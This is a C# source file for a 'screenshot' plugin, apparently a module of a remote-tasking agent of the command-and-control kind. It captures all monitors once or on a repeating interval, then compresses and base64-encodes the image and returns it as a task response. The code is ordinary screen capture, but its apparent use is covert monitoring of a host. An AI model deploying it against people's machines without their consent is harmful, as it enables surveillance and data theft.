using Athena.Commands;
using Athena.Commands.Models;
using Athena.Models;
using Athena.Models.Responses;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Plugins
{
    public class Screenshot : AthenaPlugin
    {
        private CancellationTokenSource cts = new CancellationTokenSource();
        private bool isRunning = false;
        public override string Name => "screenshot";

        public override void Execute(Dictionary<string, string> args)
        {
            int intervalInSeconds = 0; // Default interval should be 0 to take just one

            if (args.ContainsKey("cancel"))
            {
                if (isRunning)
                {
                    // Cancel the running task and reset the flag.
                    cts.Cancel();
                    isRunning = false;
                    TaskResponseHandler.Write("Screenshot task has been canceled.", args["task-id"], true, "info");
                }
                else
                {
                    TaskResponseHandler.Write("No screenshot task is currently running.", args["task-id"], true, "info");
                }
                return;
            }

            if (isRunning)
            {
                TaskResponseHandler.Write("A screenshot task is already running. Wait for it to complete or cancel it.", args["task-id"], true, "info");
                return;
            }

            if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
            {
                if (intervalInSeconds < 0)
                {
                    TaskResponseHandler.Write("Invalid interval value. It must be a non-negative integer.", args["task-id"], true, "error");
                    return;
                }

                if (intervalInSeconds == 0)
                {
                    CaptureAndSendScreenshot(args);
                    return;
                }

                // Start the task with cancellation support.
                Task.Run(async () =>
                {
                    isRunning = true;
                    await CaptureScreenshotsWithInterval(args, intervalInSeconds, cts.Token);
                    isRunning = false;
                });
            }
            else
            {
                CaptureAndSendScreenshot(args);
            }
        }

        private async Task CaptureScreenshotsWithInterval(Dictionary<string, string> args, int intervalInSeconds, CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                CaptureAndSendScreenshot(args);
                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(intervalInSeconds), token);
                }
                catch (TaskCanceledException)
                {
                    // Task was canceled, exit the loop.
                    break;
                }
            }
        }

        private void CaptureAndSendScreenshot(Dictionary<string, string> args)
        {
            try
            {
                var bitmaps = ScreenCapture.Capture();

                // Determine the size of the combined bitmap
                int combinedWidth = 0;
                int maxHeight = 0;
                foreach (var bitmap in bitmaps)
                {
                    combinedWidth += bitmap.Width;
                    if (bitmap.Height > maxHeight)
                    {
                        maxHeight = bitmap.Height;
                    }
                }

                // Create a new bitmap to hold the combined image
                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);

                // Draw each screen's bitmap onto the combined bitmap
                int x = 0;
                foreach (var bitmap in bitmaps)
                {
                    using (var graphics = Graphics.FromImage(combinedBitmap))
                    {
                        graphics.DrawImage(bitmap, x, 0);
                    }
                    x += bitmap.Width;
                }

                // Convert to base64
                var converter = new ImageConverter();
                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                byte[] outputBytes;

                // Compress the image
                using (var memoryStream = new MemoryStream())
                {
                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
                    {
                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                    }
                    outputBytes = memoryStream.ToArray();
                }

                var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
                TaskResponseHandler.AddResponse(new ResponseResult
                {
                    completed = true,
                    user_output = "Screenshot captured.",
                    task_id = args["task-id"],
                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
                });
            }
            catch (Exception e)
            {
                TaskResponseHandler.Write($"Failed to capture screenshot: {e.ToString()}", args["task-id"], true, "error");
            }
        }
    }

    class ScreenCapture
    {
        public static List<Bitmap> Capture()
        {
            var bitmaps = new List<Bitmap>();
            foreach (var screen in GetScreens())
            {
                var bitmap = new Bitmap(screen.Width, screen.Height);
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
                }
                bitmaps.Add(bitmap);
            }
            return bitmaps;
        }

        private static IEnumerable<Screen> GetScreens()
        {
            var screens = new List<Screen>();
            foreach (var displayInfo in GetDisplayInfos())
            {
                var bounds = new Rectangle(
                    displayInfo.Bounds.X,
                    displayInfo.Bounds.Y,
                    displayInfo.Bounds.Width,
                    displayInfo.Bounds.Height);

                screens.Add(new Screen(bounds));
            }
            return screens;
        }

        private class Screen
        {
            public int X { get; }
            public int Y { get; }
            public int Width { get; }
            public int Height { get; }

            public Screen(Rectangle bounds)
            {
                X = bounds.X;
                Y = bounds.Y;
                Width = bounds.Width;
                Height = bounds.Height;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        private class DisplayInfo
        {
            public Rectangle Bounds { get; set; }
        }

        private static List<DisplayInfo> GetDisplayInfos()
        {
            var monitors = new List<DisplayInfo>();

            var proc = new MonitorEnumProc((IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
            {
                var mi = new DisplayInfo();
                mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                monitors.Add(mi);

                return true;
            });

            if (!EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, proc, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception();
            }

            return monitors;
        }
    }
}
